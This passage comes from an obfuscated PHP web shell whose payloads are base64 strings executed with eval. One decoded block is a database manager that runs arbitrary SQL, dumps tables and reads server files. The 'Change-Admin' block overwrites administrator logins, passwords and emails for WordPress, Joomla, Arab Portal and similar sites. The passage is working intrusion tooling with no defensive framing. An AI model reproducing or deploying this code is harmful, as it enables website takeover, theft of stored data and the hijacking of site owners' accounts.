Fsnc3FsX3Bhc3MnXSwgJF9QT1NUWydzcWxfYmFzZSddKSkgeyAJCQlzd2l0Y2goJF9QT1NUWydjaGFyc2V0J10pIHsgCQkJCWNhc2UgIldpbmRvd3MtMTI1MSI6ICRkYi0+c2V0Q2hhcnNldCgnY3AxMjUxJyk7IGJyZWFrOyAJCQkJY2FzZSAiVVRGLTgiOiAkZGItPnNldENoYXJzZXQoJ3V0ZjgnKTsgYnJlYWs7IAkJCQljYXNlICJLT0k4LVIiOiAkZGItPnNldENoYXJzZXQoJ2tvaThyJyk7IGJyZWFrOyAJCQkJY2FzZSAiS09JOC1VIjogJGRiLT5zZXRDaGFyc2V0KCdrb2k4dScpOyBicmVhazsgCQkJCWNhc2UgImNwODY2IjogJGRiLT5zZXRDaGFyc2V0KCdjcDg2NicpOyBicmVhazsgCQkJfSAJCQkkZGItPmxpc3REYnMoKTsgCQkJZWNobyAiPHNlbGVjdCBuYW1lPXNxbF9iYXNlPjxvcHRpb24gdmFsdWU9Jyc+PC9vcHRpb24+IjsgCQkJd2hpbGUoJGl0ZW0gPSAkZGItPmZldGNoKCkpIHsgCQkJCWxpc3QoJGtleSwgJHZhbHVlKSA9IGVhY2goJGl0ZW0pOyAJCQkJZWNobyAnPG9wdGlvbiB2YWx1ZT0iJy4kdmFsdWUuJyIgJy4oJHZhbHVlPT0kX1BPU1RbJ3NxbF9iYXNlJ10/J3NlbGVjdGVkJzonJykuJz4nLiR2YWx1ZS4nPC9vcHRpb24+JzsgCQkJfSAJCQllY2hvICc8L3NlbGVjdD4nOyAJCX0gCQllbHNlIGVjaG8gJHRtcDsgCX1lbHNlIAkJZWNobyAkdG1wOyAJZWNobyAiPC90ZD4gCQkJCTx0ZD48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Jz4+JyBvbmNsaWNrPSdmcyhkLnNmKTsnPjwvdGQ+ICAgICAgICAgICAgICAgICA8dGQ+PGlucHV0IHR5cGU9Y2hlY2tib3ggbmFtZT1zcWxfY291bnQgdmFsdWU9J29uJyIgLiAoZW1wdHkoJF9QT1NUWydzcWxfY291bnQnXSk/Jyc6JyBjaGVja2VkJykgLiAiPiBjb3VudCB0aGUgbnVtYmVyIG9mIHJvd3M8L3RkPiAJCQk8L3RyPiAJCTwvdGFibGU+IAkJPHNjcmlwdD4gICAgICAgICAgICAgc19kYj0nIi5AYWRkc2xhc2hlcygkX1BPU1RbJ3NxbF9iYXNlJ10pLiInOyAgICAgICAgICAgICBmdW5jdGlvbiBmcyhmKSB7ICAgICAgICAgICAgICAgICBpZihmLnNxbF9iYXNlLnZhbHVlIT1zX2RiKSB7IGYub25zdWJtaXQgPSBmdW5jdGlvbigpIHt9OyAgICAgICAgICAgICAgICAgICAgIGlmKGYucDEpIGYucDEudmFsdWU9Jyc7ICAgICAgICAgICAgICAgICAgICAgaWYoZi5wMikgZi5wMi52YWx1ZT0nJzsgICAgICAgICAgICAgICAgICAgICBpZihmLnAzKSBmLnAzLnZhbHVlPScnOyAgICAgICAgICAgICAgICAgfSAgICAgICAgICAgICB9IAkJCWZ1bmN0aW9uIHN0KHQsbCkgeyAJCQkJZC5zZi5wMS52YWx1ZSA9ICdzZWxlY3QnOyAJCQkJZC5zZi5wMi52YWx1ZSA9IHQ7ICAgICAgICAgICAgICAgICBpZihsICYmIGQuc2YucDMpIGQuc2YucDMudmFsdWUgPSBsOyAJCQkJZC5zZi5zdWJtaXQoKTsgCQkJfSAJCQlmdW5jdGlvbiBpcygpIHsgCQkJCWZvcihpPTA7aTxkLnNmLmVsZW1lbnRzWyd0YmxbXSddLmxlbmd0aDsrK2kpIAkJCQkJZC5zZi5lbGVtZW50c1sndGJsW10nXVtpXS5jaGVja2VkID0gIWQuc2YuZWxlbWVudHNbJ3RibFtdJ11baV0uY2hlY2tlZDsgCQkJfSAJCTwvc2NyaXB0PiI7IAlpZihpc3NldCgkZGIpICYmICRkYi0+bGluayl7IAkJZWNobyAiPGJyLz48dGFibGUgd2lkdGg9MTAwJSBjZWxscGFkZGluZz0yIGNlbGxzcGFjaW5nPTA+IjsgCQkJaWYoIWVtcHR5KCRfUE9TVFsnc3FsX2Jhc2UnXSkpeyAJCQkJJGRiLT5zZWxlY3RkYigkX1BPU1RbJ3NxbF9iYXNlJ10pOyAJCQkJZWNobyAiPHRyPjx0ZCB3aWR0aD0xIHN0eWxlPSdib3JkZXItdG9wOjJweCBzb2xpZCAjNjY2Oyc+PHNwYW4+VGFibGVzOjwvc3Bhbj48YnI+PGJyPiI7IAkJCQkkdGJsc19yZXMgPSAkZGItPmxpc3RUYWJsZXMoKTsgCQkJCXdoaWxlKCRpdGVtID0gJGRiLT5mZXRjaCgkdGJsc19yZXMpKSB7IAkJCQkJbGlzdCgka2V5LCAkdmFsdWUpID0gZWFjaCgkaXRlbSk7ICAgICAgICAgICAgICAgICAgICAgaWYoIWVtcHR5KCRfUE9TVFsnc3FsX2NvdW50J10pKSAgICAgICAgICAgICAgICAgICAgICAgICAkbiA9ICRkYi0+ZmV0Y2goJGRiLT5xdWVyeSgnU0VMRUNUIENPVU5UKCopIGFzIG4gRlJPTSAnLiR2YWx1ZS4nJykpOyAJCQkJCSR2YWx1ZSA9IGh0bWxzcGVjaWFsY2hhcnMoJHZhbHVlKTsgCQkJCQllY2hvICI8bm9icj48aW5wdXQgdHlwZT0nY2hlY2tib3gnIG5hbWU9J3RibFtdJyB2YWx1ZT0nIi4kdmFsdWUuIic+Jm5ic3A7PGEgaHJlZj0jIG9uY2xpY2s9XCJzdCgnIi4kdmFsdWUuIicsMSlcIj4iLiR2YWx1ZS4iPC9hPiIgLiAoZW1wdHkoJF9QT1NUWydzcWxfY291bnQnXSk/JyZuYnNwOyc6IiA8c21hbGw+KHskblsnbiddfSk8L3NtYWxsPiIpIC4gIjwvbm9icj48YnI+IjsgCQkJCX0gCQkJCWVjaG8gIjxpbnB1dCB0eXBlPSdjaGVja2JveCcgb25jbGljaz0naXMoKTsnPiA8aW5wdXQgdHlwZT1idXR0b24gdmFsdWU9J0R1bXAnIG9uY2xpY2s9J2RvY3VtZW50LnNmLnAyLnZhbHVlPVwiZG93bmxvYWRcIjtkb2N1bWVudC5zZi5zdWJtaXQoKTsnPjxicj5GaWxlIHBhdGg6PGlucHV0IHR5cGU9dGV4dCBuYW1lPWZpbGUgdmFsdWU9J2R1bXAuc3FsJz48L3RkPjx0ZCBzdHlsZT0nYm9yZGVyLXRvcDoycHggc29saWQgIzY2NjsnPiI7IAkJCQlpZihAJF9QT1NUWydwMSddID09ICdzZWxlY3QnKSB7IAkJCQkJJF9QT1NUWydwMSddID0gJ3F1ZXJ5JzsgICAgICAgICAgICAgICAgICAgICAkX1BPU1RbJ3AzJ10gPSAkX1BPU1RbJ3AzJ10/JF9QT1NUWydwMyddOjE7IAkJCQkJJGRiLT5xdWVyeSgnU0VMRUNUIENPVU5UKCopIGFzIG4gRlJPTSAnIC4gJF9QT1NUWydwMiddKTsgCQkJCQkkbnVtID0gJGRiLT5mZXRjaCgpOyAJCQkJCSRwYWdlcyA9IGNlaWwoJG51bVsnbiddIC8gMzApOyAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjxzY3JpcHQ+ZC5zZi5vbnN1Ym1pdD1mdW5jdGlvbigpe3N0KFwiIiAuICRfUE9TVFsncDInXSAuICJcIiwgZC5zZi5wMy52YWx1ZSl9PC9zY3JpcHQ+PHNwYW4+Ii4kX1BPU1RbJ3AyJ10uIjwvc3Bhbj4gKHskbnVtWyduJ119IHJlY29yZHMpIFBhZ2UgIyA8aW5wdXQgdHlwZT10ZXh0IG5hbWU9J3AzJyB2YWx1ZT0iIC4gKChpbnQpJF9QT1NUWydwMyddKSAuICI+IjsgICAgICAgICAgICAgICAgICAgICBlY2hvICIgb2YgJHBhZ2VzIjsgICAgICAgICAgICAgICAgICAgICBpZigkX1BPU1RbJ3AzJ10gPiAxKSAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICIgPGEgaHJlZj0jIG9uY2xpY2s9J3N0KFwiIiAuICRfUE9TVFsncDInXSAuICciLCAnIC4gKCRfUE9TVFsncDMnXS0xKSAuICIpJz4mbHQ7IFByZXY8L2E+IjsgICAgICAgICAgICAgICAgICAgICBpZigkX1BPU1RbJ3AzJ10gPCAkcGFnZXMpICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIiA8YSBocmVmPSMgb25jbGljaz0nc3QoXCIiIC4gJF9QT1NUWydwMiddIC4gJyIsICcgLiAoJF9QT1NUWydwMyddKzEpIC4gIiknPk5leHQgJmd0OzwvYT4iOyAgICAgICAgICAgICAgICAgICAgICRfUE9TVFsncDMnXS0tOyAJCQkJCWlmKCRfUE9TVFsndHlwZSddPT0ncGdzcWwnKSAJCQkJCQkkX1BPU1RbJ3AyJ10gPSAnU0VMRUNUICogRlJPTSAnLiRfUE9TVFsncDInXS4nIExJTUlUIDMwIE9GRlNFVCAnLigkX1BPU1RbJ3AzJ10qMzApOyAJCQkJCWVsc2UgCQkJCQkJJF9QT1NUWydwMiddID0gJ1NFTEVDVCAqIEZST00gYCcuJF9QT1NUWydwMiddLidgIExJTUlUICcuKCRfUE9TVFsncDMnXSozMCkuJywzMCc7IAkJCQkJZWNobyAiPGJyPjxicj4iOyAJCQkJfSAJCQkJaWYoKEAkX1BPU1RbJ3AxJ10gPT0gJ3F1ZXJ5JykgJiYgIWVtcHR5KCRfUE9TVFsncDInXSkpIHsgCQkJCQkkZGItPnF1ZXJ5KEAkX1BPU1RbJ3AyJ10pOyAJCQkJCWlmKCRkYi0+cmVzICE9PSBmYWxzZSkgeyAJCQkJCQkkdGl0bGUgPSBmYWxzZTsgCQkJCQkJZWNobyAnPHRhYmxlIHdpZHRoPTEwMCUgY2VsbHNwYWNpbmc9MSBjZWxscGFkZGluZz0yIGNsYXNzPW1haW4gPic7IAkJCQkJCSRsaW5lID0gMTsgCQkJCQkJd2hpbGUoJGl0ZW0gPSAkZGItPmZldGNoKCkpCXsgCQkJCQkJCWlmKCEkdGl0bGUpCXsgCQkJCQkJCQllY2hvICc8dHI+JzsgCQkJCQkJCQlmb3JlYWNoKCRpdGVtIGFzICRrZXkgPT4gJHZhbHVlKSAJCQkJCQkJCQllY2hvICc8dGg+Jy4ka2V5Lic8L3RoPic7IAkJCQkJCQkJcmVzZXQoJGl0ZW0pOyAJCQkJCQkJCSR0aXRsZT10cnVlOyAJCQkJCQkJCWVjaG8gJzwvdHI+PHRyPic7IAkJCQkJCQkJJGxpbmUgPSAyOyAJCQkJCQkJfSAJCQkJCQkJZWNobyAnPHRyIGNsYXNzPSJsJy4kbGluZS4nIj4nOyAJCQkJCQkJJGxpbmUgPSAkbGluZT09MT8yOjE7IAkJCQkJCQlmb3JlYWNoKCRpdGVtIGFzICRrZXkgPT4gJHZhbHVlKSB7IAkJCQkJCQkJaWYoJHZhbHVlID09IG51bGwpIAkJCQkJCQkJCWVjaG8gJzx0ZD48aT5udWxsPC9pPjwvdGQ+JzsgCQkJCQkJCQllbHNlIAkJCQkJCQkJCWVjaG8gJzx0ZD4nLm5sMmJyKGh0bWxzcGVjaWFsY2hhcnMoJHZhbHVlKSkuJzwvdGQ+JzsgCQkJCQkJCX0gCQkJCQkJCWVjaG8gJzwvdHI+JzsgCQkJCQkJfSAJCQkJCQllY2hvICc8L3RhYmxlPic7IAkJCQkJfSBlbHNlIHsgCQkJCQkJZWNobyAnPGRpdj48Yj5FcnJvcjo8L2I+ICcuaHRtbHNwZWNpYWxjaGFycygkZGItPmVycm9yKCkpLic8L2Rpdj4nOyAJCQkJCX0gCQkJCX0gCQkJCWVjaG8gIjxicj48L2Zvcm0+PGZvcm0gb25zdWJtaXQ9J2Quc2YucDEudmFsdWU9XCJxdWVyeVwiO2Quc2YucDIudmFsdWU9dGhpcy5xdWVyeS52YWx1ZTtkb2N1bWVudC5zZi5zdWJtaXQoKTtyZXR1cm4gZmFsc2U7Jz48dGV4dGFyZWEgbmFtZT0ncXVlcnknIHN0eWxlPSd3aWR0aDoxMDAlO2hlaWdodDoxMDBweCc+IjsgICAgICAgICAgICAgICAgIGlmKCFlbXB0eSgkX1BPU1RbJ3AyJ10pICYmICgkX1BPU1RbJ3AxJ10gIT0gJ2xvYWRmaWxlJykpICAgICAgICAgICAgICAgICAgICAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsncDInXSk7ICAgICAgICAgICAgICAgICBlY2hvICI8L3RleHRhcmVhPjxici8+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSdFeGVjdXRlJz4iOyAJCQkJZWNobyAiPC90ZD48L3RyPiI7IAkJCX0gCQkJZWNobyAiPC90YWJsZT48L2Zvcm0+PGJyLz4iOyAgICAgICAgICAgICBpZigkX1BPU1RbJ3R5cGUnXT09J215c3FsJykgeyAgICAgICAgICAgICAgICAgJGRiLT5xdWVyeSgiU0VMRUNUIDEgRlJPTSBteXNxbC51c2VyIFdIRVJFIGNvbmNhdChgdXNlcmAsICdAJywgYGhvc3RgKSA9IFVTRVIoKSBBTkQgYEZpbGVfcHJpdmAgPSAneSciKTsgICAgICAgICAgICAgICAgIGlmKCRkYi0+ZmV0Y2goKSkgICAgICAgICAgICAgICAgICAgICBlY2hvICI8Zm9ybSBvbnN1Ym1pdD0nZC5zZi5wMS52YWx1ZT1cImxvYWRmaWxlXCI7ZG9jdW1lbnQuc2YucDIudmFsdWU9dGhpcy5mLnZhbHVlO2RvY3VtZW50LnNmLnN1Ym1pdCgpO3JldHVybiBmYWxzZTsnPjxzcGFuPkxvYWQgZmlsZTwvc3Bhbj4gPGlucHV0ICBjbGFzcz0ndG9vbHNJbnAnIHR5cGU9dGV4dCBuYW1lPWY+PGlucHV0IHR5cGU9c3VibWl0IHZhbHVlPSc+Pic+PC9mb3JtPiI7ICAgICAgICAgICAgIH0gCQkJaWYoQCRfUE9TVFsncDEnXSA9PSAnbG9hZGZpbGUnKSB7IAkJCQkkZmlsZSA9ICRkYi0+bG9hZEZpbGUoJF9QT1NUWydwMiddKTsgCQkJCWVjaG8gJzxwcmUgY2xhc3M9bWwxPicuaHRtbHNwZWNpYWxjaGFycygkZmlsZVsnZmlsZSddKS4nPC9wcmU+JzsgCQkJfSAJfSBlbHNlIHsgICAgICAgICBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGRiLT5lcnJvcigpKTsgICAgIH0gCWVjaG8gJzwvZGl2Pic7";
eval(base64_decode($tkl));
exit;
case "Change-Admin":
$tkl = "ZWNobyAnPGZvcm0gbWV0aG9kPSJQT1NUIj5TZWxlY3QgU2NyaXB0IFR5cGUgOiA8YnI+PHA+IAkJCTxzZWxlY3QgbmFtZT0iQ2hhbmdlLUFkbWluX3R5cGUiPiAJCQkJPG9wdGlvbiB2YWx1ZT0id3AiPldvcmRQcmVzczwvb3B0aW9uPiAJCQkJPG9wdGlvbiB2YWx1ZT0iam9vbSI+Sm9vbWxhPC9vcHRpb24+IAkJCQk8b3B0aW9uIHZhbHVlPSJhcmFiIj5hcmFiIHBvcnRhbDwvb3B0aW9uPiAJCQkJPG9wdGlvbiB2YWx1ZT0idmIiPnZCdWxsZXRpbjwvb3B0aW9uPiAJCQkJPG9wdGlvbiB2YWx1ZT0icGhwYmIiPnBocEJCPC9vcHRpb24+IAkJCQk8b3B0aW9uIHZhbHVlPSJ3aG1jcyI+d2htY3M8L29wdGlvbj4gCQkJCTxvcHRpb24gdmFsdWU9InplbmNhcnQiPlplbiBDYXJ0PC9vcHRpb24+IAkJCQkJCQkJPC9zZWxlY3Q+IAkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSI+PiIgLz4gCQkgCQkJPC9wPiAJCTwvZm9ybT4nOyAgIGlmICgkX1BPU1RbJ0NoYW5nZS1BZG1pbl90eXBlJ10gPT0gJ3dwJyl7IGVjaG8gJzxGT1JNIG1ldGhvZD0iUE9TVCI+IDo6OkRhdGFCYXNlIGluZm86Ojo8YnI+IGhvc3QgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0ibG9jYWxob3N0IiBuYW1lPSJsb2NhbGhvc3QiIHR5cGU9InRleHQiPiA8YnI+ZGF0YWJhc2UgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJkYXRhYmFzZSIgdHlwZT0idGV4dCI+PGJyPiA8YnI+VGFibGUgUHJlZml4IDo8YnI+IDxJTlBVVCBzaXplPSIxNSIgdmFsdWU9IndwXyIgbmFtZT0icHJlZml4IiB0eXBlPSJ0ZXh0Ij48YnI+IDxicj51c2VybmFtZSA6IDxicj48SU5QVVQgc2l6ZT0iMTUiIHZhbHVlPSIiIG5hbWU9InVzZXJuYW1lIiB0eXBlPSJ0ZXh0Ij4gPGJyPnBhc3N3b3JkIDogPGJyPjxJTlBVVCBzaXplPSIxNSIgdmFsdWU9IiIgbmFtZT0icGFzc3dvcmQiIHR5cGU9InBhc3N3b3JkIj48YnI+ICAgPGJyPjo6OldvcmRwcmVzcyBBZG1pbiBpbmZvOjo6IDxicj5OZXcgdXNlcm5hbWU6PGJyPiA8SU5QVVQgbmFtZT0iYWRtaW4iIHNpemU9IjE1IiB2YWx1ZT0iYWRtaW4iPjxicj4gTmV3IHBhc3N3b3JkOjxicj4gPElOUFVUIG5hbWU9InB3ZCIgc2l6ZT0iMTUiIHZhbHVlPSIxMjMxMjMiPjxicj4gTmV3IEVtYWlsOjxicj4gPElOUFVUIG5hbWU9ImVtYWlsIiBzaXplPSIxNSIgdmFsdWU9ImVtYWlsQHNpdGUuY29tIj48YnI+IDxJTlBVVCB2YWx1ZT0iY2hhbmdlIiBuYW1lPSJzZW5kIiB0eXBlPSJzdWJtaXQiPiA8L0ZPUk0+JzsgfSBpZiAoJF9QT1NUWydzZW5kJ10gPT0gJ2NoYW5nZScpeyAkbG9jYWxob3N0ID0gJF9QT1NUWydsb2NhbGhvc3QnXTsgJGRhdGFiYXNlICA9ICRfUE9TVFsnZGF0YWJhc2UnXTsgJHVzZXJuYW1lICA9ICRfUE9TVFsndXNlcm5hbWUnXTsgJHBhc3N3b3JkICA9ICRfUE9TVFsncGFzc3dvcmQnXTsgJHB3ZCAgID0gJF9QT1NUWydwd2QnXTsgJGFkbWluID0gJF9QT1NUWydhZG1pbiddOyAkU1FMID0gJF9QT1NUWydlbWFpbCddOyAkcHJlZml4ID0gJF9QT1NUWydwcmVmaXgnXTsgICBAbXlzcWxfY29ubmVjdCgkbG9jYWxob3N0LCR1c2VybmFtZSwkcGFzc3dvcmQpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgIEBteXNxbF9zZWxlY3RfZGIoJGRhdGFiYXNlKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICAkaGFzaCA9IGNyeXB0KCRwd2QpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFICIuJHByZWZpeC4idXNlcnMgU0VUIHVzZXJfbG9naW4gPSciLiRhZG1pbi4iJyBXSEVSRSBJRCA9IDEiKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJ1c2VycyBTRVQgdXNlcl9wYXNzID0nIi4kaGFzaC4iJyBXSEVSRSBJRCA9IDEiKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJ1c2VycyBTRVQgdXNlcl9sb2dpbiA9JyIuJGFkbWluLiInIFdIRVJFIElEID0gMiIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguInVzZXJzIFNFVCB1c2VyX3Bhc3MgPSciLiRoYXNoLiInIFdIRVJFIElEID0gMiIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguInVzZXJzIFNFVCB1c2VyX2xvZ2luID0nIi4kYWRtaW4uIicgV0hFUkUgSUQgPSAzIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFICIuJHByZWZpeC4idXNlcnMgU0VUIHVzZXJfcGFzcyA9JyIuJGhhc2guIicgV0hFUkUgSUQgPSAzIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFICIuJHByZWZpeC4idXNlcnMgU0VUIHVzZXJfZW1haWwgPSciLiRTUUwuIicgV0hFUkUgSUQgPSAxIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAgIGlmKCR0a2wpeyBlY2hvICI8Yj4gU3VjY2VzczwvYj4gIjsgfSAgfSBpZiAoJF9QT1NUWydDaGFuZ2UtQWRtaW5fdHlwZSddID09ICdqb29tJyl7IGVjaG8gJzxGT1JNIG1ldGhvZD0iUE9TVCI+IDo6OkRhdGFCYXNlIGluZm86Ojo8YnI+IGhvc3QgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0ibG9jYWxob3N0IiBuYW1lPSJsb2NhbGhvc3QiIHR5cGU9InRleHQiPiA8YnI+ZGF0YWJhc2UgOjxicj4gPElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJkYXRhYmFzZSIgdHlwZT0idGV4dCI+PGJyPiA8YnI+VGFibGUgUHJlZml4IDo8YnI+IDxJTlBVVCBzaXplPSIxNSIgdmFsdWU9Impvc18iIG5hbWU9InByZWZpeCIgdHlwZT0idGV4dCI+PGJyPiA8YnI+dXNlcm5hbWUgOiA8YnI+PElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJ1c2VybmFtZSIgdHlwZT0idGV4dCI+IDxicj5wYXNzd29yZCA6IDxicj48SU5QVVQgc2l6ZT0iMTUiIHZhbHVlPSIiIG5hbWU9InBhc3N3b3JkIiB0eXBlPSJwYXNzd29yZCI+PGJyPiAgIDxicj46OjpKb29tbGEgQWRtaW4gaW5mbzo6OiA8YnI+TmV3IHVzZXJuYW1lOjxicj4gPElOUFVUIG5hbWU9ImFkbWluIiBzaXplPSIxNSIgdmFsdWU9ImFkbWluIj48YnI+IE5ldyBwYXNzd29yZDo8YnI+IDxJTlBVVCBuYW1lPSJwd2QiIHNpemU9IjE1IiB2YWx1ZT0iMTIzMTIzIj48YnI+IE5ldyBFbWFpbDo8YnI+IDxJTlBVVCBuYW1lPSJlbWFpbCIgc2l6ZT0iMTUiIHZhbHVlPSJlbWFpbEBzaXRlLmNvbSI+PGJyPiA8SU5QVVQgdmFsdWU9ImNoYW5nZS1qb29tbGEtYWRtaW4iIG5hbWU9InNlbmQiIHR5cGU9InN1Ym1pdCI+IDwvRk9STT4nOyB9IGlmICgkX1BPU1RbJ3NlbmQnXSA9PSAnY2hhbmdlLWpvb21sYS1hZG1pbicpeyAkbG9jYWxob3N0ID0gJF9QT1NUWydsb2NhbGhvc3QnXTsgJGRhdGFiYXNlICA9ICRfUE9TVFsnZGF0YWJhc2UnXTsgJHVzZXJuYW1lICA9ICRfUE9TVFsndXNlcm5hbWUnXTsgJHBhc3N3b3JkICA9ICRfUE9TVFsncGFzc3dvcmQnXTsgJHB3ZCAgID0gJF9QT1NUWydwd2QnXTsgJGFkbWluID0gJF9QT1NUWydhZG1pbiddOyAkU1FMID0gJF9QT1NUWydlbWFpbCddOyAkcHJlZml4ID0gJF9QT1NUWydwcmVmaXgnXTsgICBAbXlzcWxfY29ubmVjdCgkbG9jYWxob3N0LCR1c2VybmFtZSwkcGFzc3dvcmQpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgIEBteXNxbF9zZWxlY3RfZGIoJGRhdGFiYXNlKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICAkaGFzaCA9IG1kNSgkcHdkKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguInVzZXJzIFNFVCB1c2VybmFtZSA9JyIuJGFkbWluLiInIFdIRVJFIHVzZXJuYW1lICA9ICdhZG1pbiciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJ1c2VycyBTRVQgcGFzc3dvcmQgPSciLiRoYXNoLiInIFdIRVJFIHVzZXJuYW1lICA9ICdhZG1pbiciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJ1c2VycyBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSB1c2VydHlwZSA9ICdkZXByZWNhdGVkJyIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguInVzZXJzIFNFVCBwYXNzd29yZCA9JyIuJGhhc2guIicgV0hFUkUgdXNlcnR5cGUgPSAnZGVwcmVjYXRlZCciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJ1c2VycyBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSB1c2VydHlwZSA9ICdTdXBlciBBZG1pbmlzdHJhdG9yJyIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSAiLiRwcmVmaXguInVzZXJzIFNFVCBwYXNzd29yZCA9JyIuJGhhc2guIicgV0hFUkUgdXNlcnR5cGUgPSAnU3VwZXIgQWRtaW5pc3RyYXRvciciKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICR0a2w9QG15c3FsX3F1ZXJ5KCJVUERBVEUgIi4kcHJlZml4LiJ1c2VycyBTRVQgZW1haWwgPSciLiRTUUwuIicgV0hFUkUgdXNlcm5hbWUgPSAnYWRtaW4nIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAgIGlmKCR0a2wpeyBlY2hvICI8Yj4gU3VjY2VzczwvYj4gIjsgfSAgfSAgICAgaWYgKCRfUE9TVFsnQ2hhbmdlLUFkbWluX3R5cGUnXSA9PSAnYXJhYicpeyBlY2hvICc8Rk9STSBtZXRob2Q9IlBPU1QiPiA6OjpEYXRhQmFzZSBpbmZvOjo6PGJyPiBob3N0IDo8YnI+IDxJTlBVVCBzaXplPSIxNSIgdmFsdWU9ImxvY2FsaG9zdCIgbmFtZT0ibG9jYWxob3N0IiB0eXBlPSJ0ZXh0Ij4gPGJyPmRhdGFiYXNlIDo8YnI+IDxJTlBVVCBzaXplPSIxNSIgdmFsdWU9IiIgbmFtZT0iZGF0YWJhc2UiIHR5cGU9InRleHQiPjxicj4gPGJyPnVzZXJuYW1lIDogPGJyPjxJTlBVVCBzaXplPSIxNSIgdmFsdWU9IiIgbmFtZT0idXNlcm5hbWUiIHR5cGU9InRleHQiPiA8YnI+cGFzc3dvcmQgOiA8YnI+PElOUFVUIHNpemU9IjE1IiB2YWx1ZT0iIiBuYW1lPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPjxicj4gICA8YnI+Ojo6QXJhYiBQb3J0YWwgQWRtaW4gaW5mbzo6OiA8YnI+TmV3IHVzZXJuYW1lOjxicj4gPElOUFVUIG5hbWU9ImFkbWluIiBzaXplPSIxNSIgdmFsdWU9ImFkbWluIj48YnI+IE5ldyBwYXNzd29yZDo8YnI+IDxJTlBVVCBuYW1lPSJwd2QiIHNpemU9IjE1IiB2YWx1ZT0iMTIzMTIzIj48YnI+IE5ldyBFbWFpbDo8YnI+IDxJTlBVVCBuYW1lPSJlbWFpbCIgc2l6ZT0iMTUiIHZhbHVlPSJlbWFpbEBzaXRlLmNvbSI+PGJyPiA8SU5QVVQgdmFsdWU9ImNoYW5nZS1hcmFiLXBvcnRhbC1hZG1pbiIgbmFtZT0ic2VuZCIgdHlwZT0ic3VibWl0Ij4gPC9GT1JNPic7IH0gaWYgKCRfUE9TVFsnc2VuZCddID09ICdjaGFuZ2UtYXJhYi1wb3J0YWwtYWRtaW4nKXsgJGxvY2FsaG9zdCA9ICRfUE9TVFsnbG9jYWxob3N0J107ICRkYXRhYmFzZSAgPSAkX1BPU1RbJ2RhdGFiYXNlJ107ICR1c2VybmFtZSAgPSAkX1BPU1RbJ3VzZXJuYW1lJ107ICRwYXNzd29yZCAgPSAkX1BPU1RbJ3Bhc3N3b3JkJ107ICRwd2QgICA9ICRfUE9TVFsncHdkJ107ICRhZG1pbiA9ICRfUE9TVFsnYWRtaW4nXTsgJFNRTCA9ICRfUE9TVFsnZW1haWwnXTsgICBAbXlzcWxfY29ubmVjdCgkbG9jYWxob3N0LCR1c2VybmFtZSwkcGFzc3dvcmQpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgIEBteXNxbF9zZWxlY3RfZGIoJGRhdGFiYXNlKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7ICAkaGFzaCA9IG1kNSgkcHdkKTsgJHRrbD1AbXlzcWxfcXVlcnkoIlVQREFURSByYWZpYV91c2VycyBTRVQgdXNlcm5hbWUgPSciLiRhZG1pbi4iJyBXSEVSRSB1c2VybmFtZSAgPSAnYWRtaW4nIikgb3IgZGllKG15c3FsX2Vycm9yKCkpOyAkdGtsPUBteXNxbF9xdWVyeSgiVVBEQVRFIHJhZmlhX3VzZXJzIFNFVCBwYXNzd29yZCA9JyIuJGhhc2guIicgV0hFUkUgdXNlcm5hbWUgID0gJ2FkbWluJyIpIG9yIGRpZShteXNxbF9lcnJvcigpKTsgJHRrbD1AbXlzc